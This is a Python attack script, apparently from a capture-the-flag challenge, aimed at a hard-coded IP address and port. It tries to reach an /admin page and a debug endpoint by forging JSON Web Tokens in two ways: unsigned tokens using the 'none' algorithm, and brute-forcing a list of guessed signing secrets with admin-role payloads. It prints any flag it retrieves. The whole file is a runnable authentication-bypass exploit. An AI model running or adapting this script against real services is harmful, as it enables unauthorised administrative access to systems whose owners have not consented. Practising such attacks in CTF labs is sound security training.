#!/usr/bin/env python3
"""
JWT Forging for Equator Navigation
"""

import requests
import jwt
import hashlib

TARGET_URL = "http://138.199.163.92:12973/"

def forge_jwt_with_geohash_secrets():
    """Forge JWT tokens with geohash-based secrets"""
    print("="*60)
    print("Forging JWT Tokens")
    print("="*60)
    
    session = requests.Session()
    
    # Geohash secrets to try
    secrets = [
        "s000", "s0000", "s00000", "s000000",
        "u000", "u0000", "u00000",
        "7zzz", "pbpb", "gbpb",
        "nullisland", "geohash",
        "s0000000",  # Precision 8
        "s00000000",  # Precision 9
    ]
    
    # Payloads to try
    payloads = [
        {"role": "admin"},
        {"role": "admin", "user": "admin"},
        {"admin": True},
        {"user": "admin", "role": "admin"},
        {"username": "admin", "role": "admin"},
        {"geohash": "s000", "role": "admin"},
    ]
    
    for secret in secrets:
        for payload in payloads:
            try:
                # Create token
                token = jwt.encode(payload, secret, algorithm="HS256")
                
                # Test it
                headers = {"Authorization": f"Bearer {token}"}
                resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=5)
                
                if resp.status_code == 200:
                    print(f"\n[!!!] SUCCESS!")
                    print(f"    Secret: {secret}")
                    print(f"    Payload: {payload}")
                    print(f"    Token: {token}")
                    print(f"\nResponse:")
                    print(resp.text)
                    
                    if 'kaal{' in resp.text.lower():
                        return resp.text
                
                # Also test geohash-debug endpoint
                resp2 = session.post(
                    TARGET_URL + 'api/v3/geohash-debug-2025',
                    json={"lat": 0.0, "lon": 0.0},
                    headers=headers,
                    timeout=5
                )
                
                if resp2.status_code == 200:
                    print(f"\n[!!!] GEOHASH-DEBUG SUCCESS!")
                    print(f"    Secret: {secret}")
                    print(f"    Payload: {payload}")
                    print(resp2.text)
                    
                    if 'kaal{' in resp2.text.lower():
                        return resp2.text
                        
            except Exception as e:
                pass
    
    print("[-] No valid JWT secret found")
    return None

def try_none_algorithm():
    """Try JWT with 'none' algorithm"""
    print("\n" + "="*60)
    print("Trying 'none' Algorithm Bypass")
    print("="*60)
    
    session = requests.Session()
    
    payloads = [
        {"role": "admin"},
        {"user": "admin", "role": "admin"},
    ]
    
    for payload in payloads:
        try:
            # Create token with no signature
            token = jwt.encode(payload, "", algorithm="none")
            
            print(f"\n[*] Testing token: {token[:50]}...")
            
            headers = {"Authorization": f"Bearer {token}"}
            resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=5)
            
            print(f"    Status: {resp.status_code}")
            
            if resp.status_code == 200:
                print(f"    [!!!] SUCCESS!")
                print(resp.text)
                
                if 'kaal{' in resp.text.lower():
                    return resp.text
        except Exception as e:
            print(f"    Error: {e}")
    
    return None

def main():
    print("JWT Forging for Equator Navigation")
    print()
    
    # Try none algorithm
    result = try_none_algorithm()
    if result:
        return
    
    # Try forging with geohash secrets
    result = forge_jwt_with_geohash_secrets()
    if result:
        return
    
    print("\n" + "="*60)
    print("No flag found")
    print("="*60)

if __name__ == "__main__":
    main()
